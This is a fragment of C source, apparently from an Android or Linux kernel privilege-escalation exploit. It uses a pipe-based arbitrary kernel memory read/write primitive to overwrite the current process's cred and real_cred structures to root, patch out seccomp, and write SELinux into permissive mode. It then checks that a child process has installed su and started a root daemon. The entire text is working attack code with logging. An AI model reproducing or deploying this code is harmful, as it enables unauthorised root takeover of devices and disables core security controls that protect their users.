  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_before = pipe_read32(fd, sid_addr);
  }
  uint64_t cred_caps_before[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_before[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_before,
      sizeof(cred_caps_before));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_before,
      sizeof(real_caps_before));
  if (!patch_cred_object(fd, current_cred_addr)) {
    pr_info("root patch cred failed cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    return 0;
  }
  if (current_real_cred_addr != current_cred_addr &&
      !patch_cred_object(fd, current_real_cred_addr)) {
    pr_info("root patch real_cred failed real=%016llx\n",
            (unsigned long long)current_real_cred_addr);
    return 0;
  }

  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root patch seccomp failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    return 0;
  }

  uint32_t cred_uid_after = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
  uint32_t real_uid_after =
    pipe_read32(fd, current_real_cred_addr + CRED_UID_OFF);
  uint64_t cred_caps_after[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_after[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_after,
      sizeof(cred_caps_after));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_after,
      sizeof(real_caps_after));
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_after = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_after = pipe_read32(fd, sid_addr);
  }
  pr_info("root cred patched uid=%u/%u sid=%u/%u\n", cred_uid_after,
          real_uid_after, cred_sid_after, real_cred_sid_after);
  pr_info("root caps patched cred eff=%016llx/%016llx prm=%016llx/%016llx "
          "amb=%016llx/%016llx bset=%016llx/%016llx real_eff=%016llx/%016llx\n",
          (unsigned long long)cred_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_after[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_before[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_after[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_before[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_after[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_before[CRED_CAP_BSET],
          (unsigned long long)cred_caps_after[CRED_CAP_BSET],
          (unsigned long long)real_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);

  uint8_t permissive = 0;
  int selinux_direct_ok =
    pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
  uint8_t selinux_mid = 0xff;
  pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
  pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
          selinux_before, selinux_mid);

  if (active_offsets->off_security_hook_heads != 0) {
    capable_head_before = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  }
  root_child_done = collect_root_child();
  struct root_report report;
  memset(&report, 0, sizeof(report));
  if (root_shared) {
    report = root_shared->report;
  }
  if (active_offsets->off_security_hook_heads != 0) {
    capable_head_after = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  }
  pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));
  pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
          "setenforce=%d/%d su=%d/%d daemon=%d wallpaper=%d/%d selinux=%u->%u "
          "cap=%016llx/%016llx\n",
          root_child_done, root_uid_after, report.setgid_ret,
          report.setgid_errno, report.setuid_ret, report.setuid_errno,
          setenforce_ret, setenforce_errno, report.su_install_ret,
          report.su_install_errno, report.su_daemon_pid, report.wallpaper_ret,
          report.wallpaper_errno,
          selinux_before, selinux_after,
          (unsigned long long)capable_head_before,
          (unsigned long long)capable_head_after);
  return root_child_done && selinux_after == 0;
}
int should_stop_cred_write(void) {
  if (getuid() == 0 && geteuid() == 0) {
    pr_success("uid=0 detected, stopping further cred writes\n");
    return 1;
  }
  return 0;
}
